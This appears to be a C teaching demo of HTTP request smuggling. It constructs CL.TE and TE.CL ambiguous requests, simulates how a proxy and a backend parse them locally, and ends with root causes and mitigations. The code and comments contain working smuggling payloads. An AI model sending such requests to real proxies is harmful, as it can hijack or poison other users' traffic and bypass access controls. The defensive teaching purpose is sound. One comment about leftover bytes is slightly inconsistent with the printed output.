#include "smuggling_demo.h"
#include "http_parser.h"
#include <stdio.h>
#include <string.h>

/* ── Helpers ────────────────────────────────────────────────────────── */

static void banner(const char *s) {
    printf("\n╔══════════════════════════════════════════╗\n");
    printf("║ %-40s ║\n", s);
    printf("╚══════════════════════════════════════════╝\n");
}

static void hexdump(const char *label, const char *buf, int len) {
    printf("%s (%d bytes):\n  ", label, len);
    for (int i = 0; i < len; i++) {
        unsigned char c = (unsigned char)buf[i];
        if (c == '\r')      printf("\\r");
        else if (c == '\n') printf("\\n\n  ");
        else                printf("%c", c);
    }
    printf("\n");
}

/* ── CL.TE Attack ───────────────────────────────────────────────────── */
/*
   The ambiguous request bytes:

   POST / HTTP/1.1\r\n
   Host: example.com\r\n
   Content-Length: 6\r\n
   Transfer-Encoding: chunked\r\n
   \r\n
   0\r\n        <- this + \r\n = 5 bytes, plus "G" = 6 bytes total body
   \r\n
   G

   Front-end (trusts Content-Length=6): reads 6 bytes of body.
     Body bytes: '0', '\r', '\n', '\r', '\n', 'G'   → valid, complete.
   Back-end (trusts Transfer-Encoding: chunked): reads chunked body.
     Chunk size line: "0\r\n" → size 0 → END OF BODY.
     Remaining socket bytes: "\r\nG" (blank line + 'G') → interpreted
     as the start of the NEXT request.
*/
void demo_cl_te(void) {
    banner("CL.TE Request Smuggling");

    /* Raw bytes of the ambiguous request */
    const char *raw =
        "POST / HTTP/1.1\r\n"
        "Host: example.com\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "G";

    int raw_len = (int)strlen(raw);
    hexdump("Ambiguous request bytes", raw, raw_len);

    printf("\n[FRONT-END PROXY] Uses Content-Length\n");
    printf("  Content-Length: 6\n");
    printf("  Reads body bytes: '0' '\\r' '\\n' '\\r' '\\n' 'G'\n");
    printf("  Front-end sees: ONE complete POST request.\n");
    printf("  Forwards all %d bytes to backend.\n", raw_len);

    /* Parse as front-end (CL-first) */
    struct http_request fe;
    http_parse_request(raw, raw_len, &fe);
    printf("  FE parsed body_len=%d body=[", fe.body_len);
    for (int i = 0; i < fe.body_len; i++) {
        unsigned char c = (unsigned char)fe.body[i];
        if (c == '\r') printf("\\r");
        else if (c == '\n') printf("\\n");
        else printf("%c", c);
    }
    printf("]\n");

    printf("\n[BACK-END SERVER] Uses Transfer-Encoding: chunked\n");
    /* Back-end sees chunked; body starts after blank line */
    /* Chunk size line: "0\r\n" → size 0 → body ends here */
    const char *body_bytes = "0\r\n\r\nG";
    char decoded[64] = {0};
    int decoded_len = http_parse_chunked_body(body_bytes,
                                              (int)strlen(body_bytes),
                                              decoded, sizeof(decoded));
    printf("  Chunked body decoded: %d bytes\n", decoded_len);
    printf("  Back-end body: (empty — terminated by chunk-size 0)\n");
    printf("  Remaining in socket buffer: 'G'\n");
    printf("\n  *** 'G' is now the start of the NEXT request on the\n");
    printf("      shared TCP connection to the backend. ***\n");
    printf("  If another victim's request follows, the backend will\n");
    printf("  prepend 'G' to it, corrupting their request line.\n");
    printf("  This can route their request to a handler the attacker\n");
    printf("  chooses, bypass WAF rules, or poison the request.\n");
}

/* ── TE.CL Attack ───────────────────────────────────────────────────── */
/*
   POST / HTTP/1.1\r\n
   Host: example.com\r\n
   Content-Length: 3\r\n
   Transfer-Encoding: chunked\r\n
   \r\n
   8\r\n             <- chunk of 8 bytes
   SMUGGLED\r\n
   0\r\n             <- terminator
   \r\n

   Front-end trusts TE:chunked → reads: chunk[8]="SMUGGLED", then chunk[0]=end.
     Total forwarded body: "SMUGGLED\r\n0\r\n\r\n"
   Back-end trusts CL=3 → reads only 3 bytes: "8\r\n" is 3 chars (+ \r\n).
     Actually reads "8\r\n" ... then stops at CL=3.
     Wait — let's do it precisely:
     Body after headers = "8\r\nSMUGGLED\r\n0\r\n\r\n"
     CL=3 → back-end reads only "8\r\n" and considers the request complete.
     Remaining: "SMUGGLED\r\n0\r\n\r\n" leaks into next request.
*/
void demo_te_cl(void) {
    banner("TE.CL Request Smuggling");

    const char *raw =
        "POST / HTTP/1.1\r\n"
        "Host: example.com\r\n"
        "Content-Length: 3\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "8\r\n"
        "SMUGGLED"
        "\r\n"
        "0\r\n"
        "\r\n";

    int raw_len = (int)strlen(raw);
    hexdump("Ambiguous request bytes", raw, raw_len);

    printf("\n[FRONT-END PROXY] Uses Transfer-Encoding: chunked\n");
    printf("  Reads chunk[8]='SMUGGLED', then chunk[0]=terminator\n");
    printf("  Front-end sees: ONE complete POST, body='SMUGGLED'\n");
    printf("  Forwards entire %d bytes to backend.\n", raw_len);

    /* Simulate chunked decoding of what FE sees */
    const char *chunks = "8\r\nSMUGGLED\r\n0\r\n\r\n";
    char decoded[64] = {0};
    int dlen = http_parse_chunked_body(chunks, (int)strlen(chunks),
                                       decoded, sizeof(decoded));
    printf("  FE decoded body (%d bytes): '%s'\n", dlen, decoded);

    printf("\n[BACK-END SERVER] Uses Content-Length: 3\n");
    printf("  Reads only 3 bytes of body: '8', '\\r', '\\n'\n");
    printf("  Back-end considers request complete after 3 body bytes.\n");
    printf("  Remaining in socket: 'SMUGGLED\\r\\n0\\r\\n\\r\\n'\n");
    printf("\n  *** 'SMUGGLED' is prepended to the next request. ***\n");
    printf("  If backend is an HTTP/1.1 server sharing connections,\n");
    printf("  the next victim's request gets 'SMUGGLED' injected at\n");
    printf("  its start — potentially routing it to /SMUGGLED path\n");
    printf("  or poisoning a cache entry.\n");
}

void smuggling_summary(void) {
    printf("\n══════════════════════════════════════════\n");
    printf(" Smuggling Root Cause & Mitigations\n");
    printf("══════════════════════════════════════════\n");
    printf("Root cause: Two parsers (proxy vs backend) disagree on\n"
           "  where a request ends because both CL and TE are present.\n\n");
    printf("RFC 7230 rule: if both CL and TE:chunked are present,\n"
           "  CL MUST be ignored. But many proxies don't enforce this.\n\n");
    printf("Impact:\n"
           "  - Bypass WAF / access control (inject request to protected path)\n"
           "  - Poison shared TCP pipeline (corrupt other users' requests)\n"
           "  - Cache poisoning (smuggle a crafted response)\n\n");
    printf("Mitigations:\n"
           "  1. Proxy: reject requests with both CL and TE headers.\n"
           "  2. Backend: normalize framing before dispatch.\n"
           "  3. Use HTTP/2 end-to-end (binary framing, no ambiguity).\n"
           "  4. Avoid HTTP/2→HTTP/1.1 downgrade at the proxy layer.\n");
}
